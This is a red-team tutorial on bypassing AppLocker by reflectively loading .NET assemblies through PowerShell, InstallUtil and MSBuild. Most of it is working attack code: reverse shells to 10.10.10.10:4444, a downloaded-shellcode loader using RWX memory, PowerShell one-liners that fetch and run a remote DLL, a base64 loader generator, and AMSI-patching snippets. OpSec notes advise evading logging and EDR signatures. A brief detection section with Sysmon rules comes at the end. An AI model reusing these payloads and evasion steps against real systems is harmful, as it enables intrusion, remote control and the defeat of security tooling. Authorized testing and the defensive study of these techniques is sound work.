---
title: "AppLocker Bypass: Reflective Assembly Load"
date: 2026-03-06
description: "Bypassing AppLocker using .NET Assembly.Load() via PowerShell reflection, InstallUtil, and MSBuild inline tasks — with payload code, a Python DLL embedder, and Sysmon detection rules."
tags: ["applocker", "bypass", "assembly-load", "installutil", "msbuild", "dotnet", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1218.004](https://attack.mitre.org/techniques/T1218/004/) (InstallUtil), [T1127.001](https://attack.mitre.org/techniques/T1127/001/) (MSBuild), and [T1620](https://attack.mitre.org/techniques/T1620/) (Reflective Code Loading).

---

## Lab Setup

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    ├── Windows 10/11 Enterprise (victim VM)
    │   ├── AppLocker default rules enforced
    │   ├── Windows Defender enabled + updated
    │   ├── .NET Framework 4.8
    │   ├── PowerShell 5.1 + Script Block Logging enabled
    │   ├── Visual Studio Build Tools (csc.exe, MSBuild.exe)
    │   ├── Sysmon (SwiftOnSecurity config)
    │   └── Sysinternals Suite
    │
    └── Kali Linux (attacker VM)
        ├── Python 3.10+
        ├── netcat / rlwrap
        └── mono (optional — compile C# on Kali)
```

### Windows VM Configuration

```powershell {linenos=inline}
# Confirm .NET Framework version
[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full").Version

# Locate csc.exe and MSBuild.exe — confirm they exist
$csc     = "${env:WINDIR}\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$msbuild = "${env:WINDIR}\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
$iu      = "${env:WINDIR}\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"

@($csc, $msbuild, $iu) | ForEach-Object {
    $exists = Test-Path $_
    $signed = (Get-AuthenticodeSignature $_).Status
    Write-Host "$(if($exists){'[OK]'}else{'[MISSING]'}) $_ — $signed"
}
```

```powershell {linenos=inline}
# Enable Script Block Logging — captures Assembly.Load calls in EID 4104
$r = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item $r -Force
Set-ItemProperty $r "EnableScriptBlockLogging" 1

# Verify AppLocker blocks untrusted scripts
$testScript = "$env:TEMP\test.ps1"
"Write-Host 'blocked?'" | Out-File $testScript
try {
    powershell -ExecutionPolicy Bypass -File $testScript
    Write-Warning "Script NOT blocked — check AppLocker script rules"
} catch {
    Write-Host "[+] AppLocker script rules active"
}
Remove-Item $testScript -Force
```

```powershell {linenos=inline}
# Compile test payload to confirm csc.exe works
$src = @"
using System;
public class Test {
    public static void Main() { Console.WriteLine("csc working"); }
}
"@
$src | Out-File "$env:TEMP\test.cs"
& $csc /out:"$env:TEMP\test.exe" "$env:TEMP\test.cs"
Write-Host "[+] csc.exe compile: $(Test-Path "$env:TEMP\test.exe")"
Remove-Item "$env:TEMP\test.cs","$env:TEMP\test.exe" -Force
```

### Snapshot

```
VM → Snapshot → "ASSEMBLYLOAD_BASELINE"
```

---

## AppLocker Coverage Gap Diagram

``` {linenos=inline}
                    APPLOCKER EVALUATION MODEL
┌───────────────────────────────────────────────────────────────┐
│                                                               │
│   Process Launch                                              │
│        │                                                      │
│        ▼                                                      │
│   ┌─────────────────────────────────────────────────────┐    │
│   │            AppLocker Policy Engine                  │    │
│   │                                                     │    │
│   │  Checks:  Binary path / publisher / hash            │    │
│   │  Scope:   .exe  .dll  .ps1  .vbs  .js  .msi        │    │
│   │                                                     │    │
│   │  ✓ powershell.exe   → ALLOW (signed Microsoft)      │    │
│   │  ✓ InstallUtil.exe  → ALLOW (signed Microsoft)      │    │
│   │  ✓ MSBuild.exe      → ALLOW (signed Microsoft)      │    │
│   └──────────────────────────┬──────────────────────────┘    │
│                              │ ALLOWED                        │
│                              ▼                                │
│   ┌──────────────────────────────────────────────────────┐   │
│   │           TRUSTED BINARY RUNNING                     │   │
│   │                                                      │   │
│   │  [System.Reflection.Assembly]::Load($bytes)          │   │
│   │                    │                                 │   │
│   │    AppLocker ───── X ──── BLIND SPOT                 │   │
│   │    never sees      │      CLR loads bytes directly   │   │
│   │    this call       │      into process address space │   │
│   │                    ▼                                 │   │
│   │            YOUR PAYLOAD RUNS                         │   │
│   │        inside trusted process                        │   │
│   └──────────────────────────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────┘
```

---

## Execution Flow by Vector

``` {linenos=inline}
VECTOR 1: PowerShell Reflective Load
─────────────────────────────────────────────────────────────────
 powershell.exe                    payload.dll (in memory)
      │                                   ▲
      │  $bytes = DownloadData(url)        │
      │  [Assembly]::Load($bytes) ─────────┘
      │  .GetType("Payload.Runner")
      │  .GetMethod("Go").Invoke()
      │
      └─► code runs inside powershell.exe — AppLocker approved it


VECTOR 2: InstallUtil
─────────────────────────────────────────────────────────────────
 InstallUtil.exe /U payload.dll
      │
      │  loads payload.dll
      │  calls Installer.Uninstall()
      │                │
      └────────────────┴─► YOUR CODE — high trust, low noise


VECTOR 3: MSBuild Inline Task
─────────────────────────────────────────────────────────────────
 MSBuild.exe revshell.proj
      │
      │  CodeTaskFactory reads <Code Type="Class">
      │  compiles C# inline via CodeDom
      │  executes Task.Execute()
      │                │
      └────────────────┴─► YOUR CODE — no DLL on disk at all
```

---

## The Core Idea

AppLocker controls which executables and scripts can run. What it doesn't, and fundamentally can't, control is what .NET assemblies a trusted, whitelisted binary loads at runtime.

The .NET CLR's `Assembly.Load()` method accepts raw bytes. Feed it a compiled assembly, and it executes inside the calling process, inheriting all of its trust. If that calling process is a Microsoft-signed binary that AppLocker considers sacred, the code you loaded never touches AppLocker's ruleset at all.

This isn't a bug in the traditional sense. It's .NET working exactly as designed, and AppLocker never having been built to handle it.

This post covers three independent vectors:

| vector | binary abused | noise level |
|--------|--------------|-------------|
| Reflective load via PowerShell | `powershell.exe` | medium |
| InstallUtil | `InstallUtil.exe` | low |
| MSBuild inline tasks | `MSBuild.exe` | low |

---

## How Assembly.Load() Bypasses AppLocker

When AppLocker evaluates a process, it checks the binary on disk against its rules: publisher, path, hash. That evaluation happens at process creation time.

`Assembly.Load(byte[])` loads an assembly from a byte array **in memory**. There is no file on disk for AppLocker to inspect. The CLR hands the bytes directly to the JIT compiler. The assembly is never written to disk, never assigned a path, never evaluated against any policy rule.

The execution model:

```
AppLocker evaluates:     powershell.exe  ← trusted, signed, allowed
                                │
AppLocker stops here     Assembly.Load(bytes[])
                                │
CLR takes over:          JIT compiles your assembly in-memory
                                │
                         Your code runs inside powershell.exe
```

Every vector below exploits some flavor of this gap.

---

## Building the Payload Assembly

All three techniques need a compiled .NET assembly to load. Let's build one: a reusable C# payload class with three escalating capabilities.

### payload.cs

```csharp {linenos=inline}
// payload.cs
// Compile: csc.exe /target:library /out:payload.dll payload.cs
//      or: dotnet build

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Threading;

namespace Payload {

    public class Runner {

        // ── 1. basic exec ─────────────────────────────────────────────────
        public static void Exec(string cmd) {
            var psi = new ProcessStartInfo {
                FileName               = "cmd.exe",
                Arguments              = "/c " + cmd,
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
                WindowStyle            = ProcessWindowStyle.Hidden
            };
            using var p = Process.Start(psi);
            string stdout = p.StandardOutput.ReadToEnd();
            string stderr = p.StandardError.ReadToEnd();
            p.WaitForExit();
            Console.Write(stdout + stderr);
        }

        // ── 2. reverse shell ──────────────────────────────────────────────
        public static void ReverseShell(string host, int port) {
            using var client = new TcpClient(host, port);
            using var stream = client.GetStream();
            using var reader = new StreamReader(stream, Encoding.ASCII);
            using var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true };

            writer.WriteLine("[+] shell from " + Environment.MachineName
                             + " as " + Environment.UserName);

            while (true) {
                writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                string line = reader.ReadLine();
                if (line == null || line.ToLower() == "exit") break;

                try {
                    var psi = new ProcessStartInfo {
                        FileName               = "powershell.exe",
                        Arguments              = "-nop -ep bypass -c " + line,
                        UseShellExecute        = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                        CreateNoWindow         = true
                    };
                    using var p = Process.Start(psi);
                    string result = p.StandardOutput.ReadToEnd()
                                  + p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    writer.WriteLine(result.TrimEnd());
                } catch (Exception ex) {
                    writer.WriteLine("[-] " + ex.Message);
                }
            }
        }

        // ── 3. staged shellcode loader ────────────────────────────────────
        //    loads encrypted shellcode from a URL, decrypts, executes
        //    matches the rolling XOR scheme from modern_runner.c
        public static void ShellcodeLoad(string url, byte key) {
            using var wc  = new WebClient();
            byte[] enc    = wc.DownloadData(url);
            byte[] sc     = new byte[enc.Length];

            // rolling XOR decrypt: out[i] = enc[i] ^ (key + i)
            for (int i = 0; i < enc.Length; i++)
                sc[i] = (byte)(enc[i] ^ ((key + i) & 0xff));

            // allocate RWX via VirtualAlloc and execute
            IntPtr mem = NativeMethods.VirtualAlloc(
                IntPtr.Zero, (uint)sc.Length,
                NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE,
                NativeMethods.PAGE_EXECUTE_READWRITE
            );
            System.Runtime.InteropServices.Marshal.Copy(sc, 0, mem, sc.Length);
            var thread = NativeMethods.CreateThread(
                IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero
            );
            NativeMethods.WaitForSingleObject(thread, 0xFFFFFFFF);
        }

        // ── entry point for InstallUtil ───────────────────────────────────
        public static void Go() {
            // swap in whichever capability you need for the engagement
            ReverseShell("10.10.10.10", 4444);
        }
    }

    // P/Invoke declarations for shellcode exec
    internal static class NativeMethods {
        public const uint MEM_COMMIT             = 0x1000;
        public const uint MEM_RESERVE            = 0x2000;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        [System.Runtime.InteropServices.DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [System.Runtime.InteropServices.DllImport("kernel32")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
}
```

**Compile:**

```cmd
:: on target or dev box with .NET SDK
csc.exe /target:library /out:payload.dll payload.cs

:: or with dotnet CLI
dotnet build -c Release -o .
```

---

## Vector 1 — Reflective Load via PowerShell

`powershell.exe` ships with full access to the .NET reflection API. `[System.Reflection.Assembly]::Load()` accepts a byte array, loads it into the current AppDomain, and gives you a handle to call into it. The assembly never touches disk.

### From a URL (no disk writes)

```powershell {linenos=inline}
# reflective_load.ps1

# pull the assembly bytes directly — nothing written to disk
$bytes = (New-Object Net.WebClient).DownloadData("http://10.10.10.10/payload.dll")

# load into current AppDomain
$asm = [System.Reflection.Assembly]::Load($bytes)

# invoke the entry point — Update namespace/class/method to match yours
$type   = $asm.GetType("Payload.Runner")
$method = $type.GetMethod("Go")
$method.Invoke($null, $null)
```

### From disk (if a dropper already placed it)

```powershell
$bytes = [IO.File]::ReadAllBytes("C:\Windows\Temp\p.dll")
$asm   = [Reflection.Assembly]::Load($bytes)
$asm.GetType("Payload.Runner").GetMethod("Go").Invoke($null, $null)
```

### One-liner (for a restricted prompt or run key)

```powershell
powershell -nop -w hidden -ep bypass -c "[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.dll')).GetType('Payload.Runner').GetMethod('Go').Invoke($null,$null)"
```

### Calling with arguments (reverse shell example)

```powershell
$asm    = [Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://10.10.10.10/payload.dll"))
$type   = $asm.GetType("Payload.Runner")
$method = $type.GetMethod("ReverseShell")

# pass host and port as object array
$method.Invoke($null, [object[]]@("10.10.10.10", 4444))
```

---

## Vector 2 — InstallUtil

`InstallUtil.exe` is a legitimate .NET utility for installing and uninstalling service components. It lives in the .NET Framework directory and is fully trusted by AppLocker default rules.

When called with the `/U` (uninstall) flag, it calls `Uninstall()` on every class in the target assembly that inherits from `System.Configuration.Install.Installer`. You build that class. You control `Uninstall()`.

### InstallUtil payload wrapper

```csharp {linenos=inline}
// installutil_payload.cs
// Wraps payload.cs functionality in the Installer interface
// Compile: csc.exe /target:library /out:iu_payload.dll installutil_payload.cs /reference:payload.dll
//      or  compile everything into one file — copy Runner class in and reference directly

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Collections;

[RunInstaller(true)]
public class IUPayload : Installer {

    // Install() — triggered with /I flag (not used here, but must exist)
    public override void Install(IDictionary state) {
        base.Install(state);
    }

    // Uninstall() — triggered with /U flag
    // InstallUtil calls this, so this is where your payload lives
    public override void Uninstall(IDictionary state) {
        base.Uninstall(state);
        Payload.Runner.Go();   // call into your payload
    }
}
```

**Or — a self-contained single file (no external dependency):**

```csharp {linenos=inline}
// iu_standalone.cs — everything in one file, no external dll needed
// Compile: csc.exe /target:library /out:iu_standalone.dll iu_standalone.cs

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Collections;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;

[RunInstaller(true)]
public class IUPayload : Installer {

    public override void Uninstall(IDictionary state) {
        // reverse shell inline — update LHOST / LPORT
        string host = "10.10.10.10";
        int    port = 4444;

        var client = new System.Net.Sockets.TcpClient(host, port);
        var stream = client.GetStream();
        var reader = new StreamReader(stream, Encoding.ASCII);
        var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true };

        writer.WriteLine("[+] " + Environment.MachineName + " / " + Environment.UserName);

        while (true) {
            writer.Write(Directory.GetCurrentDirectory() + "> ");
            string cmd = reader.ReadLine();
            if (cmd == null || cmd == "exit") break;
            try {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) {
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };
                var p = Process.Start(psi);
                writer.WriteLine(p.StandardOutput.ReadToEnd()
                               + p.StandardError.ReadToEnd());
                p.WaitForExit();
            } catch (Exception ex) {
                writer.WriteLine("[-] " + ex.Message);
            }
        }
        client.Close();
    }
}
```

**Execute:**

```cmd
:: 32-bit
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U iu_standalone.dll

:: 64-bit (more common on modern targets)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U iu_standalone.dll
```

Flag breakdown:

| flag | why it's there |
|------|---------------|
| `/logfile=` | suppress log file creation (no artifact) |
| `/LogToConsole=false` | suppress stdout noise |
| `/U` | triggers `Uninstall()` — your payload |

The process tree is clean: `InstallUtil.exe` runs, loads the assembly, executes your code. No child process unless your payload spawns one.

---

## Vector 3 — MSBuild Inline Tasks

`MSBuild.exe` can compile and execute C# code defined inline inside an `.xml` project file, with no precompiled DLL required. The compilation happens entirely in memory via `CodeTaskFactory`. AppLocker sees only the trusted `MSBuild.exe` binary.

### Basic exec — inline C#

```xml {linenos=inline}
<!-- exec.proj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Exec />
  </Target>

  <UsingTask
    TaskName="Exec"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          using System.Diagnostics;

          public class Exec : Task, ITask {
              public override bool Execute() {
                  Process.Start(new ProcessStartInfo {
                      FileName        = "calc.exe",
                      CreateNoWindow  = true,
                      UseShellExecute = false
                  });
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

### Reverse shell — inline C#

```xml {linenos=inline}
<!-- revshell.proj — update LHOST / LPORT -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Shell />
  </Target>

  <UsingTask
    TaskName="Shell"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          using System;
          using System.Diagnostics;
          using System.Net.Sockets;
          using System.IO;
          using System.Text;

          public class Shell : Task, ITask {
              public override bool Execute() {
                  string host = "10.10.10.10";
                  int    port = 4444;

                  var client = new TcpClient(host, port);
                  var stream = client.GetStream();
                  var reader = new StreamReader(stream, Encoding.ASCII);
                  var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true };

                  writer.WriteLine("[+] msbuild shell @ " + Environment.MachineName);

                  while (true) {
                      writer.Write(Directory.GetCurrentDirectory() + "> ");
                      string cmd = reader.ReadLine();
                      if (cmd == null || cmd.ToLower() == "exit") break;

                      try {
                          var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) {
                              RedirectStandardOutput = true,
                              RedirectStandardError  = true,
                              UseShellExecute        = false,
                              CreateNoWindow         = true
                          };
                          var p = Process.Start(psi);
                          writer.WriteLine(p.StandardOutput.ReadToEnd()
                                         + p.StandardError.ReadToEnd());
                          p.WaitForExit();
                      } catch (Exception ex) {
                          writer.WriteLine("[-] " + ex.Message);
                      }
                  }
                  client.Close();
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Execute:**

```cmd
:: x86
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe revshell.proj

:: x64
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe revshell.proj

:: quiet
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe /nologo /noconsolelogger revshell.proj
```

### Remote project file (no local drop)

```cmd
MSBuild.exe \\10.10.10.10\share\revshell.proj
```

Or host it on WebDAV and reference it via UNC path. MSBuild resolves UNC paths natively.

---

## Helper — DLL to Base64 Embedder

If you want to embed your payload DLL directly in the PowerShell loader (zero network traffic, zero disk touches):

```python {linenos=inline}
#!/usr/bin/env python3
# dll_to_ps1.py — convert payload.dll to self-contained PowerShell loader

import base64
import sys
import os

def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} payload.dll [output.ps1]")
        sys.exit(1)

    dll_path = sys.argv[1]
    out_path = sys.argv[2] if len(sys.argv) >= 3 else "loader.ps1"

    with open(dll_path, "rb") as f:
        raw = f.read()

    b64 = base64.b64encode(raw).decode()

    # chunk into 120-char lines so it doesn't choke old PowerShell hosts
    lines = [b64[i:i+120] for i in range(0, len(b64), 120)]
    b64_block = " `\n".join(f'"{l}"' for l in lines)

    ps1 = f"""# auto-generated by dll_to_ps1.py
# payload: {os.path.basename(dll_path)}  ({len(raw)} bytes)
$b64 = {b64_block}

$bytes = [Convert]::FromBase64String($b64)
$asm   = [Reflection.Assembly]::Load($bytes)
$type  = $asm.GetType("Payload.Runner")
$type.GetMethod("Go").Invoke($null, $null)
"""

    with open(out_path, "w") as f:
        f.write(ps1)

    print(f"[+] wrote {out_path}  ({len(ps1)} bytes)")
    print(f"[*] run:  powershell -nop -ep bypass -w hidden -f {out_path}")

if __name__ == "__main__":
    main()
```

```bash
python3 dll_to_ps1.py payload.dll loader.ps1
# outputs a fully self-contained PS1 — no network calls, no disk DLL
```

---

## Chaining the Vectors

For engagements where PowerShell is restricted but the filesystem is writable:

```
1. Drop revshell.proj via any file write primitive (upload, LFI, writable share)
2. Execute: MSBuild.exe /nologo /noconsolelogger revshell.proj
3. Catch shell on your listener
```

For heavily restricted environments (no writable paths, constrained language mode):

```
1. Find a path that AppLocker allows (e.g. C:\Windows\Temp or a user-writable path in a path rule)
2. Compile DLL on attacker box, base64-encode with dll_to_ps1.py
3. Deliver PS1 via any mechanism (phishing, macro, existing shell)
4. [Reflection.Assembly]::Load() sidesteps CLM restrictions in many configurations
```

---

## OpSec Notes

- **PowerShell Script Block Logging** (Event ID 4104) will capture your `Assembly.Load()` call and the surrounding code. If ScriptBlock logging is enabled, obfuscate the method name: string concatenation, `GetMethod("Re"+"verseShell")`, etc.
- **AMSI** scans the in-memory assembly bytes before CLR executes them. A known payload DLL will be caught. XOR-encrypt the bytes before download and decrypt in PowerShell before passing to `Assembly.Load()`.
- **MSBuild** running from a non-standard working directory, especially with `/nologo /noconsolelogger`, is a fairly quiet signal, but MSBuild making outbound network connections is loud. Prefer local project files where possible.
- **InstallUtil** with `/logfile=` (empty log path) and `/U` on an unsigned DLL is a known red-team pattern. Defender and most EDRs have signatures for this exact combination, so rename the DLL and sign it with a self-signed cert to change the hash.

---

## AMSI Bypass for Assembly.Load()

If AMSI is catching your DLL bytes, patch it out before loading. Pair this with your loader:

```powershell
# amsi_patch.ps1 — patch AmsiScanBuffer to always return clean
# run before Assembly.Load()

$amsi   = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field  = $amsi.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null, $true)
```

Or at the byte-patch level (more robust against reflection-based detection):

```powershell {linenos=inline}
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c = $b.GetValue($null)
[IntPtr]$ptr = $c

# overwrite AmsiScanBuffer return value
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
$marshal = [System.Runtime.InteropServices.Marshal]
$old = 0
$marshal::VirtualProtect($ptr, [uint32]$patch.Length, 0x40, [ref]$old)
$marshal::Copy($patch, 0, $ptr, $patch.Length)
```

> Patch once at the start of your PS session. All subsequent `Assembly.Load()` calls go through unpatched.

---

## Detection (Blue Team)

| signal | event / source |
|--------|---------------|
| `InstallUtil.exe` loading unsigned assemblies | Sysmon EID 7 — ImageLoad, check Signed field |
| `MSBuild.exe` spawning network connections | Sysmon EID 3 — NetworkConnect |
| `MSBuild.exe` or `InstallUtil.exe` spawning shells | Sysmon EID 1 — ProcessCreate, ParentImage |
| PowerShell `Assembly.Load` with byte array | EID 4104 — ScriptBlock logging |
| AMSI bypass patterns in script blocks | EID 4104 — string match on `amsiInitFailed`, `AmsiUtils` |
| .NET assembly loaded from network path | ETW — Microsoft-Windows-DotNETRuntime |

**Sysmon rules:**

```xml {linenos=inline}
<!-- MSBuild / InstallUtil network activity -->
<NetworkConnect onmatch="include">
  <Image condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe</Image>
  <Image condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</Image>
</NetworkConnect>

<!-- suspicious child processes -->
<ProcessCreate onmatch="include">
  <ParentImage condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</ParentImage>
  <ParentImage condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe</ParentImage>
</ProcessCreate>
```

**Mitigation:** WDAC (Windows Defender Application Control) with script enforcement and ETW-based inspection covers most of these. AppLocker path/publisher rules alone won't cover these. These binaries are by definition trusted.

---

## MITRE ATT&CK

| field | value |
|-------|-------|
| Tactic | Defense Evasion |
| T1218.004 | System Binary Proxy Execution: InstallUtil |
| T1127.001 | Trusted Developer Utilities: MSBuild |
| T1620 | Reflective Code Loading |
| T1059.001 | Command and Scripting: PowerShell |
| Platforms | Windows |
| Permissions Required | User |

---

## References

- [MITRE ATT&CK T1218.004 — InstallUtil](https://attack.mitre.org/techniques/T1218/004/)
- [MITRE ATT&CK T1127.001 — MSBuild](https://attack.mitre.org/techniques/T1127/001/)
- [MITRE ATT&CK T1620 — Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)
- [LOLBAS — InstallUtil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)
- [LOLBAS — MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
- Casey Smith — original MSBuild/InstallUtil research
- [Red Canary — .NET reflection abuse](https://redcanary.com)
